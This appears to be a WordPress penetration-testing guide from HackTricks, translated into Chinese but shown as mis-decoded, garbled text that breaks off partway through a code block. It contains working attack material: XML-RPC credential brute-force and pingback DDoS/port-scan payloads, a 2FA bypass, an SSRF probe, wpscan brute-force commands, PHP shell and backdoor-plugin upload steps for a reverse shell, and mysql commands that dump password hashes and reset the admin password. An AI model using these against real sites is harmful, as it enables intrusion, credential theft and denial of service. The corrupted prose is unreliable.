# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **ä¸Šä¼ çš„** æ–‡ä»¶ä½äº: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **ä¸»é¢˜æ–‡ä»¶å¯ä»¥åœ¨ /wp-content/themes/ ä¸­æ‰¾åˆ°ï¼Œ** æ‰€ä»¥å¦‚æœä½ æ›´æ”¹ä¸»é¢˜çš„ä¸€äº› php æ–‡ä»¶ä»¥è·å– RCEï¼Œä½ å¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** ä½ å¯ä»¥ **è®¿é—®** **404.php** æ–‡ä»¶åœ¨: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **å¦ä¸€ä¸ªæœ‰ç”¨çš„ URL å¯èƒ½æ˜¯ï¼š** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­ä½ å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„æ ¹å¯†ç ã€‚
- é»˜è®¤ç™»å½•è·¯å¾„æ£€æŸ¥: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦ WordPress æ–‡ä»¶**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` ç”¨äºè®¾ç½®æ–° WordPress ç«™ç‚¹æ—¶çš„ç”µå­é‚®ä»¶æ¿€æ´»è¿‡ç¨‹ã€‚
- ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰ï¼š
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªä»£è¡¨ WordPress åŠŸèƒ½çš„æ–‡ä»¶ï¼Œå…è®¸æ•°æ®é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶ï¼ŒXML ä½œä¸ºç¼–ç æœºåˆ¶è¿›è¡Œä¼ è¾“ã€‚è¿™ç§ç±»å‹çš„é€šä¿¡å·²è¢« WordPress [REST API](https://developer.wordpress.org/rest-api/reference) æ›¿ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜å‚¨æ’ä»¶å’Œä¸»é¢˜çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å­˜å‚¨ä¸Šä¼ åˆ°å¹³å°çš„ä»»ä½•æ–‡ä»¶çš„ç›®å½•ã€‚
- `wp-includes/` è¿™æ˜¯å­˜å‚¨æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚
- `wp-sitemap.xml` åœ¨ WordPress ç‰ˆæœ¬ 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å…±å¸–å­å’Œå¯å…¬å¼€æŸ¥è¯¢çš„å¸–å­ç±»å‹åŠåˆ†ç±»æ³•çš„ç«™ç‚¹åœ°å›¾ XML æ–‡ä»¶ã€‚

**åæœŸåˆ©ç”¨**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åç§°ã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€è®¤è¯å¯†é’¥å’Œç›ï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚æ­¤é…ç½®æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºæ¿€æ´» DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶éå¸¸æœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

- **ç®¡ç†å‘˜**
- **ç¼–è¾‘è€…**ï¼šå‘å¸ƒå’Œç®¡ç†ä»–å’Œå…¶ä»–äººçš„å¸–å­
- **ä½œè€…**ï¼šå‘å¸ƒå’Œç®¡ç†è‡ªå·±çš„å¸–å­
- **è´¡çŒ®è€…**ï¼šæ’°å†™å’Œç®¡ç†è‡ªå·±çš„å¸–å­ä½†ä¸èƒ½å‘å¸ƒ
- **è®¢é˜…è€…**ï¼šæµè§ˆå¸–å­å¹¶ç¼–è¾‘ä»–ä»¬çš„ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å– WordPress ç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦å¯ä»¥æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºä»£ç ** ä¸­ï¼ˆæ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/) çš„ç¤ºä¾‹ï¼‰ï¼š

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### æå–ç‰ˆæœ¬ä¸€èˆ¬æ¥è¯´
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

æ‚¨å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°å®ƒä»¬ï¼Œæ‚¨éœ€è¦**ä¸»åŠ¨æš´åŠ›ç ´è§£æ’ä»¶å’Œä¸»é¢˜çš„åˆ—è¡¨**ï¼ˆå¸Œæœ›å¯¹æˆ‘ä»¬æ¥è¯´ï¼Œæœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«è¿™äº›åˆ—è¡¨ï¼‰ã€‚

### ç”¨æˆ·

- **ID æš´åŠ›ç ´è§£ï¼š** æ‚¨å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£ç”¨æˆ· ID ä» WordPress ç½‘ç«™è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œè¿™æ„å‘³ç€ id æ˜¯ **æœ‰æ•ˆ** çš„ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œåˆ™ id æ˜¯ **æ— æ•ˆ** çš„ã€‚

- **wp-json:** æ‚¨è¿˜å¯ä»¥é€šè¿‡æŸ¥è¯¢æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯ä»¥æ­ç¤ºç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
æ³¨æ„ï¼Œæ­¤ç«¯ç‚¹ä»…æš´éœ²å·²å‘å¸ƒå¸–å­çš„ç”¨æˆ·ã€‚**ä»…æä¾›å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

è¿˜è¦æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages** å¯èƒ½ä¼šæ³„éœ² IP åœ°å€ã€‚

- **ç™»å½•ç”¨æˆ·åæšä¸¾**ï¼šåœ¨ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œ**æ¶ˆæ¯**åœ¨æŒ‡ç¤ºçš„ **ç”¨æˆ·åæ˜¯å¦å­˜åœ¨** æ—¶æ˜¯ **ä¸åŒçš„**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œå‡­æ®æš´åŠ›ç ´è§£æˆ–åˆ©ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚ï¼ˆæ‚¨å¯ä»¥é€šè¿‡[ä½¿ç”¨è¿™ä¸ª](https://github.com/relarizky/wpxploit)æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼Œä¾‹å¦‚ï¼‰ã€‚

è¦æŸ¥çœ‹å®ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¯·å°è¯•è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€æ­¤è¯·æ±‚ï¼š

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**å‡­æ®æš´åŠ›ç ´è§£**

**`wp.getUserBlogs`**ã€**`wp.getCategories`** æˆ– **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥æš´åŠ›ç ´è§£å‡­æ®çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼äºï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
æ¶ˆæ¯ _"ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"_ åº”åœ¨ 200 ä»£ç å“åº”ä¸­å‡ºç°ï¼Œå¦‚æœå‡­æ®æ— æ•ˆã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­æ®ï¼Œæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ï¼Œè·¯å¾„å°†å‡ºç° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
è¿˜æœ‰ä¸€ç§**æ›´å¿«çš„æ–¹æ³•**å¯ä»¥ä½¿ç”¨**`system.multicall`**è¿›è¡Œæš´åŠ›ç ´è§£å‡­æ®ï¼Œå› ä¸ºæ‚¨å¯ä»¥åœ¨åŒä¸€è¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­æ®ï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡ 2FA**

æ­¤æ–¹æ³•æ˜¯é’ˆå¯¹ç¨‹åºè€Œéäººç±»çš„ï¼Œå¹¶ä¸”è¾ƒæ—§ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æœ‰æ•ˆçš„å‡­æ®ï¼Œä½†ä¸»è¦å…¥å£å—åˆ° 2FA ä¿æŠ¤ï¼Œ**æ‚¨å¯èƒ½èƒ½å¤Ÿåˆ©ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº›å‡­æ®ç™»å½•ï¼Œä»è€Œç»•è¿‡ 2FA**ã€‚è¯·æ³¨æ„ï¼Œæ‚¨å°†æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ‚¨ä»ç„¶å¯èƒ½èƒ½å¤Ÿè¾¾åˆ° RCEï¼Œæ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ä¸­è§£é‡Šçš„é‚£æ ·ã€‚

**DDoS æˆ–ç«¯å£æ‰«æ**

å¦‚æœæ‚¨å¯ä»¥åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°æ–¹æ³• _**pingback.ping**_ï¼Œåˆ™å¯ä»¥ä½¿ Wordpress å‘ä»»ä½•ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥ç”¨æ¥è¯·æ±‚**æˆåƒä¸Šä¸‡**çš„ Wordpress **ç«™ç‚¹**å»**è®¿é—®**ä¸€ä¸ª**ä½ç½®**ï¼ˆå› æ­¤åœ¨è¯¥ä½ç½®é€ æˆ**DDoS**ï¼‰ï¼Œæˆ–è€…æ‚¨å¯ä»¥ç”¨å®ƒè®©**Wordpress**å»**æ‰«æ**ä¸€äº›å†…éƒ¨**ç½‘ç»œ**ï¼ˆæ‚¨å¯ä»¥æŒ‡å®šä»»ä½•ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ°çš„ **faultCode** å€¼ **å¤§äº** **0** (17)ï¼Œè¿™æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ä½¿ç”¨ï¼Œäº†è§£å¦‚ä½•åˆ©ç”¨æ­¤æ–¹æ³•é€ æˆ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸ä½äºWordpressç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼š**`/wp-cron.php`**\
å½“è®¿é—®æ­¤æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªâ€œ**é‡**â€çš„MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤å¯èƒ½è¢«**æ”»å‡»è€…**ç”¨æ¥**é€ æˆ****DoS**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php`åœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆæ¯å½“å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•Wordpressé¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç½‘ç«™ä¸Šå¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªçœŸå®çš„cronjobï¼Œä»¥å®šæœŸæ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆè€Œä¸é€ æˆé—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—®_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWordpressç«™ç‚¹å¯èƒ½ä¼šå‘æ‚¨å‘å‡ºè¯·æ±‚ã€‚

å½“å®ƒä¸èµ·ä½œç”¨æ—¶çš„å“åº”æ˜¯ï¼š

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

æ­¤å·¥å…·æ£€æŸ¥**methodName: pingback.ping**å’Œè·¯å¾„**/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œå®ƒä¼šå°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡è¦†ç›–ä¸€ä¸ªæ¯”ç‰¹è·å–è®¿é—®æƒé™

è¿™ä¸ä»…ä»…æ˜¯ä¸€æ¬¡çœŸæ­£çš„æ”»å‡»ï¼Œè€Œæ˜¯ä¸€ç§å¥½å¥‡ã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»ä½• WordPress æ–‡ä»¶ä¸­çš„ 1 ä¸ªæ¯”ç‰¹ã€‚å› æ­¤ï¼Œä½ å¯ä»¥å°†æ–‡ä»¶ `/var/www/html/wp-includes/user.php` ä¸­çš„ä½ç½® `5389` ç¿»è½¬ä¸º NOP NOT (`!`) æ“ä½œã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ‰€ç”¨ä¸»é¢˜çš„ phpï¼ˆéœ€è¦ç®¡ç†å‘˜å‡­æ®ï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404 æ¨¡æ¿ï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../images/image (384).png>)

åœ¨äº’è”ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥æ›´æ–°é¡µé¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¿…é¡»è®¿é—®è¿™é‡Œ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

æ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## æ’ä»¶ RCE

### PHP æ’ä»¶

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä½¿ç”¨ä¾‹å¦‚ä»¥ä¸‹æ–¹æ³•åˆ›å»ºæ‚¨çš„ php åé—¨ï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ’ä»¶ï¼š

![](<../../images/image (722).png>)

ä¸Šä¼ æ’ä»¶å¹¶æŒ‰â€œç«‹å³å®‰è£…â€ï¼š

![](<../../images/image (249).png>)

ç‚¹å‡»ç»§ç»­ï¼š

![](<../../images/image (70).png>)

è¿™å¯èƒ½çœ‹èµ·æ¥æ²¡æœ‰ä»»ä½•ååº”ï¼Œä½†å¦‚æœæ‚¨å»åª’ä½“ï¼Œæ‚¨ä¼šçœ‹åˆ°æ‚¨çš„ shell å·²ä¸Šä¼ ï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œæ‚¨å°†çœ‹åˆ°æ‰§è¡Œåå‘ shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### ä¸Šä¼ å’Œæ¿€æ´»æ¶æ„æ’ä»¶

æ­¤æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„æ’ä»¶ï¼Œå¹¶å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å– web shellã€‚æ­¤è¿‡ç¨‹é€šè¿‡ WordPress ä»ªè¡¨æ¿è¿›è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

1. **æ’ä»¶è·å–**ï¼šä»åƒ Exploit DB è¿™æ ·çš„æ¥æºè·å–æ’ä»¶ï¼Œå¦‚ [**è¿™é‡Œ**](https://www.exploit-db.com/exploits/36374)ã€‚
2. **æ’ä»¶å®‰è£…**ï¼š
- å¯¼èˆªåˆ° WordPress ä»ªè¡¨æ¿ï¼Œç„¶åè½¬åˆ° `ä»ªè¡¨æ¿ > æ’ä»¶ > ä¸Šä¼ æ’ä»¶`ã€‚
- ä¸Šä¼ ä¸‹è½½æ’ä»¶çš„ zip æ–‡ä»¶ã€‚
3. **æ’ä»¶æ¿€æ´»**ï¼šæ’ä»¶æˆåŠŸå®‰è£…åï¼Œå¿…é¡»é€šè¿‡ä»ªè¡¨æ¿æ¿€æ´»ã€‚
4. **åˆ©ç”¨**ï¼š
- å®‰è£…å¹¶æ¿€æ´»æ’ä»¶â€œreflex-galleryâ€ï¼Œå¯ä»¥åˆ©ç”¨å®ƒï¼Œå› ä¸ºå·²çŸ¥å­˜åœ¨æ¼æ´ã€‚
- Metasploit æ¡†æ¶æä¾›äº†æ­¤æ¼æ´çš„åˆ©ç”¨ã€‚é€šè¿‡åŠ è½½é€‚å½“çš„æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªç»æˆæƒè®¿é—®ã€‚
- æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç½‘ç«™çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…æ‹¬æè¿°åœ¨ WordPress ä»ªè¡¨æ¿ä¸­å®‰è£…å’Œæ¿€æ´»æ’ä»¶æ­¥éª¤çš„è§†è§‰è¾…åŠ©å·¥å…·ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´åœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹æ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œä»…åœ¨æ³•å¾‹èƒŒæ™¯ä¸‹ä½¿ç”¨ï¼Œä¾‹å¦‚åœ¨è·å¾—æ˜ç¡®è®¸å¯çš„æ¸—é€æµ‹è¯•ä¸­ã€‚

**æœ‰å…³æ›´è¯¦ç»†çš„æ­¥éª¤ï¼Œè¯·æŸ¥çœ‹ï¼š** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## ä» XSS åˆ° RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike)ï¼š_**WPXStrike**_ æ˜¯ä¸€ä¸ªæ—¨åœ¨å°† **è·¨ç«™è„šæœ¬ (XSS)** æ¼æ´å‡çº§ä¸º **è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)** æˆ–å…¶ä»– WordPress ä¸­çš„å…³é”®æ¼æ´çš„è„šæœ¬ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [**æ­¤å¸–å­**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã€‚å®ƒæä¾›å¯¹ **Wordpress ç‰ˆæœ¬ 6.X.Xã€5.X.X å’Œ 4.X.X çš„æ”¯æŒï¼Œå¹¶å…è®¸ï¼š**
- _**æƒé™æå‡ï¼š**_ åœ¨ WordPress ä¸­åˆ›å»ºç”¨æˆ·ã€‚
- _**(RCE) è‡ªå®šä¹‰æ’ä»¶ï¼ˆåé—¨ï¼‰ä¸Šä¼ ï¼š**_ å°†æ‚¨çš„è‡ªå®šä¹‰æ’ä»¶ï¼ˆåé—¨ï¼‰ä¸Šä¼ åˆ° WordPressã€‚
- _**(RCE) å†…ç½®æ’ä»¶ç¼–è¾‘ï¼š**_ ç¼–è¾‘ WordPress ä¸­çš„å†…ç½®æ’ä»¶ã€‚
- _**(RCE) å†…ç½®ä¸»é¢˜ç¼–è¾‘ï¼š**_ ç¼–è¾‘ WordPress ä¸­çš„å†…ç½®ä¸»é¢˜ã€‚
- _**(è‡ªå®šä¹‰) è‡ªå®šä¹‰åˆ©ç”¨ï¼š**_ é’ˆå¯¹ç¬¬ä¸‰æ–¹ WordPress æ’ä»¶/ä¸»é¢˜çš„è‡ªå®šä¹‰åˆ©ç”¨ã€‚

## åæœŸåˆ©ç”¨

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress æ’ä»¶æ¸—é€æµ‹è¯•

### æ”»å‡»é¢

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½æ˜¯å‘ç°å…¶åŠŸèƒ½æ¼æ´çš„å…³é”®ã€‚æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹è¦ç‚¹ä¸­æ‰¾åˆ°æ’ä»¶å¯èƒ½æš´éœ²åŠŸèƒ½çš„æ–¹å¼ï¼Œä»¥åŠä¸€äº›æ˜“å—æ”»å‡»æ’ä»¶çš„ç¤ºä¾‹åœ¨ [**è¿™ç¯‡åšå®¢æ–‡ç« **](https://nowotarski.info/wordpress-nonce-authorization/) ä¸­ã€‚

- **`wp_ajax`**

æ’ä»¶æš´éœ²åŠŸèƒ½çš„ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡ AJAX å¤„ç†ç¨‹åºã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€æˆæƒæˆ–èº«ä»½éªŒè¯é”™è¯¯ã€‚æ­¤å¤–ï¼Œè¿™äº›åŠŸèƒ½é€šå¸¸ä¼šåŸºäº Wordpress nonce çš„å­˜åœ¨æ¥è¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒï¼Œè€Œ **ä»»ä½•åœ¨ Wordpress å®ä¾‹ä¸­ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰**ï¼ˆæ— è®ºå…¶è§’è‰²å¦‚ä½•ï¼‰ã€‚

è¿™äº›æ˜¯å¯ä»¥ç”¨æ¥åœ¨æ’ä»¶ä¸­æš´éœ²åŠŸèƒ½çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä½¿å¾—è¯¥ç«¯ç‚¹å¯ä»¥è¢«ä»»ä½•ç”¨æˆ·è®¿é—®ï¼ˆç”šè‡³æ˜¯æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœè¯¥å‡½æ•°ä»…ä½¿ç”¨ `wp_verify_nonce` æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œè¯¥å‡½æ•°åªæ˜¯æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œé€šå¸¸å¹¶ä¸æ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ï¼Œä½æƒé™ç”¨æˆ·å¯èƒ½ä¼šè®¿é—®é«˜æƒé™çš„æ“ä½œã€‚

- **REST API**

è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ `register_rest_route` å‡½æ•°ä» WordPress æš´éœ²å‡½æ•°ã€‚
```php
register_rest_route(
$this->namespace, '/get/', array(
